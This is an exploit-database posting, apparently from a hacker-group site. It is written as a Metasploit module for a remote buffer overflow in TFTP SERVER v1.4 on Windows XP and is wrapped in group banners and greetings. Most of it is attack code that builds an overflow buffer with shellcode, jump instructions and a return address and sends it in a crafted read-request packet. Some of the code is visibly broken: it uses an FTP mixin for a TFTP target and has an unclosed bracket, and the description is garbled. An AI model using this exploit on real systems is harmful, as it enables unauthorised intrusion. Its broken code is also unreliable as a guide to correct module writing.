1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

###
# Title : TFTP SERVER v1.4 (RRQ) Remote Root BOF Exploit (MSF)
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com | kedans@facebook.com
# Home : Hassi.Messaoud (30500) - Algeria -(00213555248701)
# Web Site : www.1337day.com * sec4ever.com * r00tw0rm.com
# Facebook : http://facebook.com/KedAns
# platform : windows (Remote)
# Type : Remote r00t & Buffer Ov3rfl0w
# Tested on : winXP sp3 (en)
###

##
# I'm BaCk fr0m OURHOUD ^__^ .. I m!Ss tHe Explo!tInG <3 <3 ^_*
##

##
# | >> --------+++=[ Dz Offenders Cr3w ]=+++-------- << |
# | > Indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3   |
# | Jago-dz * Over-X * Kha&miX * Ev!LsCr!pT_Dz * Dr.55h |
# | KinG Of PiraTeS * The g0bl!n * soucha * dr.R!dE  .. |
# | ------------------------------------------------- < |
##

##
# $Id: tftp14rrq_bof.rb | 2012-01-15 | 00:01 | KedAns-Dz $
##

require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking
 
  include Msf::Exploit::Remote::Ftp
 
  def initialize(info = {})
    super(update_info(info,
    'Name' => 'TFTP SERVER v1.4 (RRQ) Remote Root BOF Exploit',
    'Description' => %q{
    This module exploits a After some simple fuzzing with spike I discovered that sending a Read
  Request (RRQ) packet can also trigger a buffer overflow
    },
    'Author' => [
     'KedAns-Dz <ked-h[at]hotmail.com>', # t0 MSF
    ],
    'License' => MSF_LICENSE,
    'Version' => '$Revision: 0.1',
    'References' =>
      [
       [ 'URL', 'http://1337day.com/exploits/17361' ], # by b33f
       [ 'URL', 'http://www.exploit-db.com/exploits/10542' ], # by Molotov
      ],
    'DefaultOptions' =>
      {
       'EXITFUNC' => 'process',
      },
    'Payload' =>
      {
       'BadChars' => "\x00\x0d",
      },
    'Platform' => 'win',
    'Targets' =>
      [
       [ 'TFTP SERVER v1.4 (Windows XP-SP3 / netascii mod)',
        {
        'Ret' => 0x00409605, # ppr (from TFTPServer.exe)
        'Offset' => 93,
        'Mode' => 'netascii'
        }
       ],

       ],
    'DefaultTarget' => 0))
    end
  
  def check
       connect
       disconnect

        if (banner =~ /TFTP SERVER v1.4/)
        return Exploit::CheckCode::Vulnerable
        end
        return Exploit::CheckCode::Safe
  end
 
    def exploit
       connect_login
 
       print_status("Trying target #{target.name}...")
 
        buf = make_nops(target['Offset']) # Nop's
        buf << payload.encoded
    buf << "\x41" * 1487
    buf << "\xE9\x2E\xFA\xFF\xFF" # jump back
    buf << "\xEB\xF9\x90\x90" # jump back 5-bytes
    buf << [target.ret].pack('V')
    buf << make_nops(18) # Padding
        
    dz = "\x00\x01"
    dz << buf
    dz << "\x00"
    dz << [target['Mode']
    dz << "\x00"
    
        send_cmd(dz, false )
 
       handler
       disconnect
    end
  
end

#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]=====================================
# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > || Rizky Ariestiyansyah * Islam Caddy ..
# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re * CrosS (www.1337day.com) 
# Inj3ct0r Members 31337 : Indoushka * KnocKout * SeeMe * Kalashinkov3 * ZoRLu * anT!-Tr0J4n * 
# Angel Injection (www.1337day.com/team) * Dz Offenders Cr3w * Algerian Cyber Army * Sec4ever
# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * Jago-dz * Over-X
# Kha&miX * Str0ke * JF * Ev!LsCr!pT_Dz * KinG Of PiraTeS * www.packetstormsecurity.org * TreX
# www.metasploit.com * UE-Team & I-BackTrack * r00tw0rm.com * All Security and Exploits Webs ..
#================================================================================================
